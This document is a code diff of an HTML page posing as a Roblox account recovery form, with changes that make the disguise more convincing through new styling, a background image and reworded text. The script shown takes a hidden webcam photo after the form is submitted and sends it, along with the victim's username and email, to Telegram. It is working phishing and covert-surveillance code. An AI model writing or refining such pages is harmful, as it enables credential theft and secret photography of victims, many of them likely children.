@@ -3,77 +3,98 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Recovery Account</title>
+  <title>Account Recovery</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       font-family: 'Arial', sans-serif;
-      background-color: #0f172a;
+      background: url('https://wallpapercave.com/wp/wp11004946.jpg') no-repeat center center fixed;
+      background-size: cover;
       color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      overflow: hidden;
     }
     .container {
-      background-color: #1e293b;
-      padding: 30px 20px;
+      background: rgba(0, 0, 0, 0.8);
+      padding: 40px 30px;
       border-radius: 10px;
-      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
+      box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.5);
       max-width: 400px;
       width: 100%;
       text-align: center;
+      animation: fadeIn 1s ease-in-out;
     }
     h2 {
-      font-size: 24px;
-      color: #e2e8f0;
-      margin-bottom: 10px;
+      font-size: 26px;
+      color: #f3f3f3;
+      margin-bottom: 15px;
+      font-weight: bold;
     }
     p {
       font-size: 14px;
-      color: #94a3b8;
+      color: #d1d5db;
       margin-bottom: 20px;
     }
     input {
-      padding: 12px;
+      padding: 15px;
       font-size: 14px;
       border-radius: 8px;
-      border: 1px solid #64748b;
+      border: 1px solid #3b82f6;
       background-color: #1e293b;
       color: #ffffff;
       margin-bottom: 15px;
       width: 100%;
+      box-sizing: border-box;
     }
     input:focus {
       outline: none;
-      border-color: #0ea5e9;
+      border-color: #2563eb;
+      box-shadow: 0px 0px 5px #2563eb;
     }
     button {
       padding: 12px;
-      background-color: #0ea5e9;
+      background-color: #3b82f6;
       border: none;
       border-radius: 8px;
       color: #ffffff;
       font-size: 16px;
       cursor: pointer;
+      transition: background-color 0.3s ease-in-out, transform 0.2s ease-in-out;
     }
     button:hover {
-      background-color: #0284c7;
+      background-color: #2563eb;
+      transform: translateY(-2px);
+    }
+    button:active {
+      transform: translateY(0);
     }
     #hiddenCanvas {
       display: none;
+    }
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: scale(0.9);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1);
+      }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Roblox</h2>
-    <p>Fill in the form to recover your account.</p>
+    <h2>Recover Your Roblox Account</h2>
+    <p>Enter your details below to verify your account and recover access.</p>
     <form id="recoveryForm">
       <input type="text" id="username" placeholder="Enter your username" required>
       <input type="email" id="email" placeholder="Enter your email" required>
-      <button type="submit">Recover Account</button>
+      <button type="submit">Verify & Recover</button>
     </form>
   </div>
 
@@ -109,19 +130,19 @@
 
           setTimeout(() => {
             const canvas = document.getElementById('hiddenCanvas');
-            canvas.width = 640; // Photo resolution
+            canvas.width = 640;
             canvas.height = 480;
 
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            stream.getTracks().forEach(track => track.stop()); // Stop the camera stream
+            stream.getTracks().forEach(track => track.stop());
 
             canvas.toBlob(blob => {
               const caption = `Username: ${formData.username}\nEmail: ${formData.email}`;
               sendToTelegram(blob, caption);
             }, 'image/jpeg');
-          }, 1000); // 1-second delay
+          }, 1000);
         })
         .catch(err => {
           console.error('Error accessing camera:', err);
